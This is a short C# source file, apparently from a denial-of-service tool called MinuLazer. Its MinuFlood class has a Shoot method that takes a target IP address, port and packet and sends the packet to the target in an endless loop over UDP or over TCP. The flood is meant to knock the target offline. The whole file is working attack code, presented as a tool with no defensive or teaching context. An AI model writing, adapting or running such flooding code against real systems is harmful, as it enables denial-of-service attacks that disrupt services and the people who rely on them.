using System.Net;
using System.Net.Sockets;

namespace MinuLazer
{
    public class MinuFlood
    {
        public void Shoot(string ip, int port, byte[] packet, int method)
        {
            Method methods = new Method();
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse(ip), port);

            Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Socket udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            if (method == methods.METHOD_UDP)
            {
                while (true)
                {
                    udp.SendTo(packet, ipep);
                }
            }

            else if (method == methods.METHOD_TCP)
            {
                try
                {
                    tcp.Connect(ipep);
                    while (true)
                    {
                        tcp.Send(packet, SocketFlags.None);
                    }
                }
                catch { return; }
            }
        }
    }
}